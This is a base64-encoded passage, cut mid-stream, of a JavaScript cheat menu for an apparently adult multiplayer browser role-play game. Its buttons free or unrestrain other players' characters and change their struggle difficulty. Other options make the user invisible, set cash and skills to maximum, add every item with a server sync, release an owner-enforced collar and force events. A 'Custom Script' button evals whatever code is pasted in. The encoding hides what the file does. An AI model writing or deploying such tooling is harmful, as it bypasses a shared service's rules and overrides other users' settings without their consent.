9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uMyA9IGNyZWF0ZUJ1dHRvbigiRnJlZSBUYXJnZXQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6Q2hhcmFjdGVyUmVsZWFzZVRvdGFsKEN1cnJlbnRDaGFyYWN0ZXIpLENoYXRSb29tQ2hhcmFjdGVyVXBkYXRlKEN1cnJlbnRDaGFyYWN0ZXIpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjQgPSBjcmVhdGVCdXR0b24oIlJlbW92ZSBSZXN0cmFpbnQiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6SW52ZW50b3J5VW5sb2NrKEN1cnJlbnRDaGFyYWN0ZXIsIEN1cnJlbnRDaGFyYWN0ZXIuRm9jdXNHcm91cC5OYW1lKTsKICAgIEludmVudG9yeVJlbW92ZShDdXJyZW50Q2hhcmFjdGVyLCBDdXJyZW50Q2hhcmFjdGVyLkZvY3VzR3JvdXAuTmFtZSk7CiAgICBDaGF0Um9vbUNoYXJhY3Rlckl0ZW1VcGRhdGUoQ3VycmVudENoYXJhY3RlciwgQ3VycmVudENoYXJhY3Rlci5Gb2N1c0dyb3VwLk5hbWUpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjUgPSBjcmVhdGVCdXR0b24oIlRhcmdldCBTdHJ1Z2dsZSBEaWZmaWN1bHR5IiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OmRve3ZhciBkaWZjPXByb21wdCgnRGlmZmljdWx0eVx4MjAxLTk2Jyk7fXdoaWxlKCEoZGlmYz49MHgxJiZkaWZjPD0weDYwKSk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtSGVhZCIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU1vdXRoIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgyIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTW91dGgzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQXJtcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUhhbmRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTGVncyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUV5ZXMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1GZWV0IiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtRGV2aWNlcyIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbUFkZG9uIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVjayIsIGRpZmMpOwogICAgSW52ZW50b3J5U2V0RGlmZmljdWx0eShDdXJyZW50Q2hhcmFjdGVyLCAiSXRlbU5lY2tSZXN0cmFpbnRzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTmVja0FjY2Vzc29yaWVzIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtQm9vdHMiLCBkaWZjKTsKICAgIEludmVudG9yeVNldERpZmZpY3VsdHkoQ3VycmVudENoYXJhY3RlciwgIkl0ZW1Ib29kIiwgZGlmYyk7CiAgICBJbnZlbnRvcnlTZXREaWZmaWN1bHR5KEN1cnJlbnRDaGFyYWN0ZXIsICJJdGVtTm9zZSIsIGRpZmMpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoQ3VycmVudENoYXJhY3Rlcik7CiAgICBzaG93VG9hc3RzY3BnKCk7Cn0pOwp2YXIgYnV0dG9uNiA9IGNyZWF0ZUJ1dHRvbigiT3BlbiBUYXJnZXQgV2FyZHJvYmUiLCBmdW5jdGlvbigpIHsKICAgIGphdmFzY3JpcHQ6RGlhbG9nQ2hhbmdlQ2xvdGhlcygpOwogICAgc2hvd1RvYXN0c2NwZygpOwp9KTsKdmFyIGJ1dHRvbjcgPSBjcmVhdGVCdXR0b24oIkNvbXBsZXRlIFN0cnVnZ2xlIE1pbmlnYW1lIiwgZnVuY3Rpb24oKSB7CiAgICBjb250ZXh0TWVudU9wZW4gPSBmYWxzZTsKICAgIGphdmFzY3JpcHQ6U3RydWdnbGVQcm9ncmVzcyA9MTAwMDsKICAgIGNvbnRleHRNZW51LnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7CiAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgICAgIENoYXRSb29tQ2xpY2tDaGFyYWN0ZXIoUGxheWVyKTsKICAgICAgICBEaWFsb2dMZWF2ZSgpOwogICAgfSwgNTAwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKfSk7Cgp2YXIgYnV0dG9uOCA9IGNyZWF0ZUJ1dHRvbigiSW52aXNpYmxlIiwgZnVuY3Rpb24oKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeUdldChQbGF5ZXIsICJFbW90aWNvbiIpLlByb3BlcnR5Lk92ZXJyaWRlSGVpZ2h0ID0gewogICAgICBIZWlnaHQ6ICItIgogICAgICB9OwogICAgICBDdXJyZW50U2NyZWVuID09PSAiQ2hhdFJvb20iID8KICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKSA6CiAgICAgIENoYXJhY3RlclJlZnJlc2goUGxheWVyKTsKICAgICAgQ2hhdFJvb21DaGFyYWN0ZXJVcGRhdGUoUGxheWVyKTsgCiAgICAgIHZpc2IgPSBmYWxzZTsKICAgICAgc2hvd1RvYXN0c2NwZygpOwogICAgICB1cGRhdGVDb250ZXh0TWVudSgpOyAKCiAgICAKfSk7Cgp2YXIgYnV0dG9uOSA9IGNyZWF0ZUJ1dHRvbigiVmlzaWJsZSIsIGZ1bmN0aW9uKCkgewogIGphdmFzY3JpcHQ6Q2hhcmFjdGVyU2V0QWN0aXZlUG9zZShQbGF5ZXIsIG51bGwpOwogIGRlbGV0ZSBJbnZlbnRvcnlHZXQoUGxheWVyLCAnRW1vdGljb24nKS5Qcm9wZXJ0eS5PdmVycmlkZUhlaWdodDsKICBDdXJyZW50U2NyZWVuID09PSAnQ2hhdFJvb20nID8KICBDaGF0Um9vbUNoYXJhY3RlclVwZGF0ZShQbGF5ZXIpIDoKICBDaGFyYWN0ZXJSZWZyZXNoKFBsYXllcik7CiAgICAgIHZpc2IgPSB0cnVlOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgdXBkYXRlQ29udGV4dE1lbnUoKTsgCiAgCn0pOwoKdmFyIGJ1dHRvbjEwID0gY3JlYXRlQnV0dG9uKCJDdXN0b20gU2NyaXB0IiwgZnVuY3Rpb24oKSB7CiAgamF2YXNjcmlwdDp2YXIgc2NycCA9IHByb21wdCgiUGFzdGUgeW91ciBzY3JpcHQgaGVyZToiKTsKICBpZiAoc2NycCkgewogICAgZXZhbChzY3JwKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICB9Cn0pOwovLyBUcmFuc2l0aW9uIHN0eWxpbmcgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b24yLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uMy5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjQuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b241LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uNi5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjcuc3R5bGUudHJhbnNpdGlvbiA9ICJiYWNrZ3JvdW5kLWNvbG9yIDAuMnMgZWFzZS1pbi1vdXQiOwpidXR0b244LnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKYnV0dG9uOS5zdHlsZS50cmFuc2l0aW9uID0gImJhY2tncm91bmQtY29sb3IgMC4ycyBlYXNlLWluLW91dCI7CmJ1dHRvbjEwLnN0eWxlLnRyYW5zaXRpb24gPSAiYmFja2dyb3VuZC1jb2xvciAwLjJzIGVhc2UtaW4tb3V0IjsKCgoKLy9Ib3ZlciBldmVudHMgZm9yIHRoZSBidXR0b25zCmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CiAgICB0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKICAgIHRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwogICAgfSk7CmJ1dHRvbjEuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKICAgIHRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7CiAgICB9KTsKCmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjIuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b24zLmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uNC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjUuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3ZlciIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIjZGRkZGRkIjsKdGhpcy5zdHlsZS53aWR0aCA9ICIxOTBweCI7Cn0pOwpidXR0b242LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uNy5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwLjVweCI7Cn0pOwpidXR0b243LmFkZEV2ZW50TGlzdGVuZXIoIm1vdXNlb3V0IiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiI7Cn0pOwoKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uOC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW91dCIsIGZ1bmN0aW9uKCkgewp0aGlzLnN0eWxlLmJhY2tncm91bmRDb2xvciA9ICIiOwp9KTsKCmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdmVyIiwgZnVuY3Rpb24oKSB7CnRoaXMuc3R5bGUuYmFja2dyb3VuZENvbG9yID0gIiNkZGRkZGQiOwp0aGlzLnN0eWxlLndpZHRoID0gIjE5MHB4IjsKfSk7CmJ1dHRvbjkuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgpidXR0b24xMC5hZGRFdmVudExpc3RlbmVyKCJtb3VzZW92ZXIiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiI2RkZGRkZCI7CnRoaXMuc3R5bGUud2lkdGggPSAiMTkwcHgiOwp9KTsKYnV0dG9uMTAuYWRkRXZlbnRMaXN0ZW5lcigibW91c2VvdXQiLCBmdW5jdGlvbigpIHsKdGhpcy5zdHlsZS5iYWNrZ3JvdW5kQ29sb3IgPSAiIjsKfSk7CgovL0Ryb3Bkb3duIE1lbnVfX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX19fX18KCmZ1bmN0aW9uIGZvcmNlY2xvc2VtZW51KCkgewogICAgICBjb250ZXh0TWVudS5zdHlsZS5kaXNwbGF5ID0gIm5vbmUiOwogICAgICBDaGF0Um9vbUNsaWNrQ2hhcmFjdGVyKFBsYXllcik7CiAgICAgIERpYWxvZ0xlYXZlKCk7CiAgY29udGV4dE1lbnVPcGVuID0gZmFsc2U7CiAgfQoKIC8vIERyb3Bkb3duIG1lbnUKdmFyIHNlbGVjdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoInNlbGVjdCIpOwpzZWxlY3Quc3R5bGUuYm9yZGVyUmFkaXVzID0gIjJweCI7CnNlbGVjdC5zdHlsZS5wYWRkaW5nID0gIjRweCI7CnNlbGVjdC5zdHlsZS53aWR0aCA9ICIyMDBweCI7CnNlbGVjdC5zdHlsZS5tYXJnaW5Ub3AgPSAiLTIwcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luUmlnaHQgPSAiMnB4IjsKc2VsZWN0LnN0eWxlLm1hcmdpbkJvdHRvbSA9ICIzcHgiOwpzZWxlY3Quc3R5bGUubWFyZ2luTGVmdCA9ICIycHgiOwp2YXIgb3B0aW9uMSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xLnZhbHVlID0gIm9wdDEiOwpvcHRpb24xLnRleHQgPSAiUGVyc29uYWxpc2F0aW9uIE1lbnUiOwpvcHRpb24xLnNlbGVjdGVkID0gdHJ1ZTsKb3B0aW9uMS5kaXNhYmxlZCA9IHRydWU7CnZhciBvcHRpb24yID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjIudmFsdWUgPSAib3B0MiI7Cm9wdGlvbjIudGV4dCA9ICJFZGl0IENhc2giOwp2YXIgb3B0aW9uMyA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24zLnZhbHVlID0gIm9wdDMiOwpvcHRpb24zLnRleHQgPSAiTWF4IFNraWxscyI7CnZhciBvcHRpb240ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjQudmFsdWUgPSAib3B0NCI7Cm9wdGlvbjQudGV4dCA9ICJNYXggUmVwdXRhdGlvbiI7CnZhciBvcHRpb241ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjUudmFsdWUgPSAib3B0NSI7Cm9wdGlvbjUudGV4dCA9ICJQdXJjaGFzZSBFdmVyeXRoaW5nIjsKdmFyIG9wdGlvbjYgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNi52YWx1ZSA9ICJvcHQ2IjsKb3B0aW9uNi50ZXh0ID0gIlJlbGVhc2UgT3duZXIgQ29sbGFyIjsKdmFyIG9wdGlvbjcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uNy52YWx1ZSA9ICJvcHQ3IjsKb3B0aW9uNy50ZXh0ID0gIisxIExBUlAgTGV2ZWwiOwp2YXIgb3B0aW9uOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb244LnZhbHVlID0gIm9wdDgiOwpvcHRpb244LnRleHQgPSAiQmVjb21lIEVzY2FwZWQgUGF0aWVudCI7CnZhciBvcHRpb245ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjkudmFsdWUgPSAib3B0OSI7Cm9wdGlvbjkudGV4dCA9ICJCZWNvbWUgQ2x1YiBTbGF2ZSI7CnZhciBvcHRpb24xMCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMC52YWx1ZSA9ICJvcHQxMCI7Cm9wdGlvbjEwLnRleHQgPSAiUmVsZWFzZSBDbHViIFRpdGxlIjsKdmFyIG9wdGlvbjExID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjExLnZhbHVlID0gIm9wdDExIjsKb3B0aW9uMTEudGV4dCA9ICJTZXQgR0dUUyBMZXZlbCI7CnZhciBvcHRpb24xMiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xMi52YWx1ZSA9ICJvcHQxMiI7Cm9wdGlvbjEyLnRleHQgPSAiU2V0IERvbS9TdWIgTGV2ZWwiOwp2YXIgb3B0aW9uMTMgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTMudmFsdWUgPSAib3B0MTMiOwpvcHRpb24xMy50ZXh0ID0gIlNldCBOaWNrbmFtZSI7CnZhciBvcHRpb24xNCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNC52YWx1ZSA9ICJvcHQxNCI7Cm9wdGlvbjE0LnRleHQgPSAiRm9yY2UgT3JnYXNtIjsKdmFyIG9wdGlvbjE1ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE1LnZhbHVlID0gIm9wdDE1IjsKb3B0aW9uMTUudGV4dCA9ICJCQ00gRGlzY29yZCI7CnZhciBvcHRpb24xNiA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xNi52YWx1ZSA9ICJvcHQxNiI7Cm9wdGlvbjE2LnRleHQgPSAiRm9yY2UgTG9iYnkiOwp2YXIgb3B0aW9uMTcgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJvcHRpb24iKTsKb3B0aW9uMTcudmFsdWUgPSAib3B0MTciOwpvcHRpb24xNy50ZXh0ID0gIkxBUlAgT3B0aW9ucyI7CnZhciBvcHRpb24xOCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoIm9wdGlvbiIpOwpvcHRpb24xOC52YWx1ZSA9ICJvcHQxOCI7Cm9wdGlvbjE4LnRleHQgPSAiRW1vdGUgTWVudSAoYCArIEUpIjsKdmFyIG9wdGlvbjE5ID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgib3B0aW9uIik7Cm9wdGlvbjE5LnZhbHVlID0gIm9wdDE5IjsKb3B0aW9uMTkudGV4dCA9ICJQZXJzaXN0YW50IFNldHRpbmdzIChgICsgUykiOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMSk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24yKTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNCk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb24xMik7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb241KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uNyk7CnNlbGVjdC5hcHBlbmRDaGlsZChvcHRpb244KTsKc2VsZWN0LmFwcGVuZENoaWxkKG9wdGlvbjkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTApOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTEpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTMpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTQpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTYpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTcpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTgpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTkpOwpzZWxlY3QuYXBwZW5kQ2hpbGQob3B0aW9uMTUpOwoKCgovLyBCdXR0b24gdG8gc2hvdyB0aGUgZHJvcGRvd24gbWVudQp2YXIgZHJvcGRvd25CdXR0b24gPSBjcmVhdGVCdXR0b24oIlBlcnNvbmFsaXNhdGlvbiIsIGZ1bmN0aW9uKCkgewogIHNlbGVjdC5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKfSk7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLm9wYWNpdHkgPSAiMCI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvaW50ZXJFdmVudHMgPSAibm9uZSI7CmRyb3Bkb3duQnV0dG9uLnN0eWxlLnBvc2l0aW9uID0gImFic29sdXRlIjsKZHJvcGRvd25CdXR0b24uc3R5bGUudG9wID0gIi05OTk5cHgiOwpkcm9wZG93bkJ1dHRvbi5zdHlsZS5sZWZ0ID0gIi05OTk5cHgiOwpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2xpY2siLCBmdW5jdGlvbihldmVudCkgewogIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOyAKfSk7CgpzZWxlY3QuYWRkRXZlbnRMaXN0ZW5lcigiY2hhbmdlIiwgZnVuY3Rpb24oKSB7CiAgdmFyIHNlbGVjdGVkT3B0aW9uID0gc2VsZWN0Lm9wdGlvbnNbc2VsZWN0LnNlbGVjdGVkSW5kZXhdLnZhbHVlOwogIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDEiKSB7CiAgICBqYXZhc2NyaXB0OlBsYXllci5Nb25leSA9IDk5OTk5OTkKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGV2ZW50LnN0b3BQcm9wYWdhdGlvbigpOwogICAgZXZlbnQuc3RvcFByb3BhZ2F0aW9uKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQyIikgewogICAgamF2YXNjcmlwdDpQbGF5ZXIuTW9uZXkgPSBwcm9tcHQoIkVudGVyIENhc2ggQW1vdW50Iik7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQzIikgewogICAgamF2YXNjcmlwdDpTa2lsbENoYW5nZSgiSW5maWx0cmF0aW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIlNlbGZCb25kYWdlIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIldpbGxwb3dlciIsIDEwKTsKICAgIFNraWxsQ2hhbmdlKCJFdmFzaW9uIiwgMTApOwogICAgU2tpbGxDaGFuZ2UoIkJvbmRhZ2UiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiRHJlc3NhZ2UiLCAxMCk7CiAgICBTa2lsbENoYW5nZSgiTG9ja1BpY2tpbmciLCAxMCk7CiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ0IikgewogICAgamF2YXNjcmlwdDpSZXB1dGF0aW9uQ2hhbmdlKCJHYW1pbmciLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiR2FtYmxpbmciLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTEFSUCIsIDEwMCk7CiAgICBSZXB1dGF0aW9uQ2hhbmdlKCJNYWlkIiwgMTAwKTsKICAgIFJlcHV0YXRpb25DaGFuZ2UoIkFCREwiLCAxMDApOwogICAgUmVwdXRhdGlvbkNoYW5nZSgiTnVyc2UiLCAxMDApOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0NSIpIHsKICAgIGphdmFzY3JpcHQ6U2VydmVyUGxheWVyU3luYwogICAgQXNzZXRGZW1hbGUzRENHLmZvckVhY2goZ3JvdXA9Pmdyb3VwLkFzc2V0LmZvckVhY2goaXRlbT0+SW52ZW50b3J5QWRkKFBsYXllciwgaXRlbS5OYW1lLCBncm91cC5Hcm91cCkpKTsKICAgIFNlcnZlclBsYXllckludmVudG9yeVN5bmMoKTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDYiKSB7CiAgICBqYXZhc2NyaXB0OkludmVudG9yeVJlbW92ZShQbGF5ZXIsICJJdGVtTmVjayIpOwogICAgQ2hhdFJvb21DaGFyYWN0ZXJJdGVtVXBkYXRlKFBsYXllciwgIkl0ZW1OZWNrIik7CiAgICBMb2dBZGQoIlJlbGVhc2VkQ29sbGFyIiwgIk93bmVyUnVsZSIpOyAKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2VtZW51KCk7CiAgfSBlbHNlIGlmIChzZWxlY3RlZE9wdGlvbiA9PT0gIm9wdDciKSB7CiAgICBqYXZhc2NyaXB0OmFsZXJ0KCdTdGFydCBhIExBUlAgc2Vzc2lvbiAmIHNlbGVjdCBjbGFzcyBiZWZvcmUgcnVubmluZycpOwogICAgR2FtZUxBUlBMZXZlbFByb2dyZXNzKDEwMCkgCiAgICBzaG93VG9hc3RzY3BnKCk7CiAgICBmb3JjZWNsb3NlbWVudSgpOwogIH0gZWxzZSBpZiAoc2VsZWN0ZWRPcHRpb24gPT09ICJvcHQ4IikgewogICAgamF2YXNjcmlwdDpMb2dBZGQoIkVzY2FwZWQiLCAiQXN5bHVtIiwgQ3VycmVudFRpbWUgKyA5OTk5OTk5OTkpOwogICAgc2hvd1RvYXN0c2NwZygpOwogICAgZm9yY2VjbG9zZW1lbnUoKTsKICB9IGVsc2UgaWYgKHNlbGVjdGVkT3B0aW9uID09PSAib3B0OSIpIHsKICAgIGphdmFzY3JpcHQ6TG9nQWRkKCJDbHViU2xhdmUiLCAiTWFuYWdlbWVudCIsIEN1cnJlbnRUaW1lICsgOTk5OTk5OTk5KTsKICAgIHNob3dUb2FzdHNjcGcoKTsKICAgIGZvcmNlY2xvc2Vt